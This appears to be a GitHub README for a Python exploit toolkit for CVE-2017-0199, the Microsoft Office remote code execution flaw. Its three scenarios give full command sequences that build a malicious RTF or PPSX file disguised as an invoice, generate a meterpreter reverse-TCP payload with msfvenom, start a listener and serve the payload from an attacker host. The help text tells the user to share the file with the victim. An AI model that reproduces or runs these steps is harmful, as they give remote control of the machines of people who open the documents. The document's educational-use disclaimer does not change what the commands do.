## Exploit toolkit CVE-2017-0199 - v4.0

Exploit toolkit CVE-2017-0199 - v4.0 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. It could generate a malicious RTF/PPSX file and deliver metasploit / meterpreter / other payload to victim without any complex configuration. 

### Disclaimer

This program is for Educational purpose ONLY. Do not use it without permission. The usual disclaimer applies, especially the fact that me (bhdresh) is not liable for any damages caused by direct or indirect use of the information or functionality provided by these programs. The author or any Internet provider bears NO responsibility for content or misuse of these programs or any derivatives thereof. By using this program you accept the fact that any damage (dataloss, system crash, system compromise, etc.) caused by the use of these programs is not bhdresh's responsibility.

Finally, this is a personal development, please respect its philosophy and don't use it for bad things!

### Licence
CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/

### Release note:

Introduced following capabilities to the script

	- Generate Malicious PPSX file
	- Exploitation mode for generated PPSX file
	- Updated template.ppsx

Version: Python version 2.7.13

### Scenario 1: Deliver local payload
###### Example commands
	1) Generate malicious RTF file
	   # python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.56.1/logo.doc
	2) (Optional, if using MSF Payload) : Generate metasploit payload and start handler
	   # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f exe > /tmp/shell.exe
	   # msfconsole -x "use multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.56.1; run"
	3) Start toolkit in exploit mode to deliver local payload
	   # python cve-2017-0199_toolkit.py -M exp -t RTF -e http://192.168.56.1/shell.exe -l /tmp/shell.exe
###### Sequence diagram

![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v3.0-beta-2.0/Scenario1.jpg)


### Scenario 2: Deliver Remote payload
###### Example commands
	1) Generate malicious RTF file
	   # python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.56.1/logo.doc
	2) Start toolkit in exploit mode to deliver remote payload
	   # python cve-2017-0199_toolkit.py -M exp -t RTF -e http://remoteserver.com/shell.exe
###### Sequence diagram

![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v3.0-beta-2.0/Scenario2.jpg)


### Scenario 3: Deliver custom HTA file
###### Example commands
	1) Generate malicious RTF file
	   # python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.56.1/logo.doc -x 1
	2) Start toolkit in exploit mode to deliver custom HTA file
	   # python cve-2017-0199_toolkit.py -M exp -t RTF -H /tmp/custom.hta
###### Sequence diagram

![alt tag](https://raw.githubusercontent.com/bhdresh/CVE-2017-0199/v3.0-beta-2.0/Scenario3.jpg)


### Command line arguments:

    # python cve-2017-0199_toolkit.py -h

    This is a handy toolkit to exploit CVE-2017-0199 (Microsoft office RCE)

    Modes:

    -M gen                                          Generate Malicious file only

         Generate malicious RTF/PPSX file:

          -w <Filename.rtf/Filename.ppsx>     Name of malicious RTF/PPSX file (Share this file with victim).

          -u <http://attacker.com/test.hta>   The path to an HTA/SCT file. Normally, this should be a domain or IP where        this                                          tool is running.
	                                      For example, http://attackerip.com/test.doc (This URL will be included in 	                                              malicious RTF/PPSX file and will be requested once victim will open malicious RTF file.
	      -t RTF|PPSX (default = RTF)         Type of the file to be generated.
          -x 0|1  (default = 0)               Generate obfuscated RTF file. 0 = Disable, 1 = Enable.

					      
    -M exp                                          Start exploitation mode

         Exploitation:
	 
	      -t RTF|PPSX (default = RTF)         Type of file to be exolited.
          -H </tmp/custom>                Local path of a custom HTA/SCT file which needs to be delivered and executed on target.
	                                          NOTE: This option will not deliver payloads specified through options "-e" and "-l"
						  
          -p <TCP port:Default 80>            Local port number.

          -e <http://attacker.com/shell.exe>  The path of an executable file / meterpreter shell / payload  which needs to be executed on target.

          -l </tmp/shell.exe>                 If payload is hosted locally, specify local path of an executable file / meterpreter shell / payload.


### Credit

@nixawk for RTF sample, @Li Haifei, @bhdresh

### Bug, issues, feature requests

Obviously, I am not a fulltime developer so expect some hiccups

Please report bugs, issues through https://github.com/bhdresh/CVE-2017-0199/issues/new
